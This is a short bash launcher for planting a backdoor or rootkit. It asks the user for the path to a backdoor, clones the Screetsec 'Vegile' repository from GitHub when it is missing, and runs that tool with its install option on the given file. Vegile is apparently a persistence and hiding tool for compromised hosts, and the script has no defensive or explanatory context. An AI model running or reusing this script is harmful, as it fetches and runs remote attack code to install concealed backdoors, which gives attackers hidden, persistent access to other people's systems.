#!/bin/bash
apt-get update
clear
echo "Enter path to backdoor/rootkit: "
read -p 'Path: ' path
if [ -d Vegile ]; then
cd  Vegile
chmod +x Vegile
./Vegile --i $path
clear
echo "Goodbye! "
else
git clone https://github.com/Screetsec/Vegile.git
cd Vegile
chmod +x Vegile
./Vegile --i $path
clear
echo "Done!"
fi
                #End of script
